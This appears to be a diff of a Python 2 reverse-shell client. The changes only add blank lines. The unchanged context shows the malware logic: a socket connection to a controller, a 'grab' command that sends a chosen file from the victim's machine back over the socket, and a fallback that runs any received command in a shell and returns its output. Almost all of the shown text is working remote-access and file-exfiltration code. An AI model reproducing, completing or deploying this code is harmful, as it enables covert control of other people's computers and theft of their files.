@@ -14,7 +14,7 @@ def transfer(s,path):
         f.close()
     else:           #If File not Found
         s.send('Unable to find out the file')
-   
+        
 def connect():
 
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -26,6 +26,7 @@ def connect():
         if 'terminate' in command:
             s.close() #Close the socket
             break
+            
         elif 'grab' in command:   #grab*C:\Users\file-name
             grab,path=command.split('*')      
             try:
@@ -33,6 +34,7 @@ def connect():
             except Exception,e:
                 s.send(str(e))
                 pass
+            
         else:
             CMD=subprocess.Popen(command,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)  #Starting the shell
             s.send(CMD.stdout.read())  #Send the result
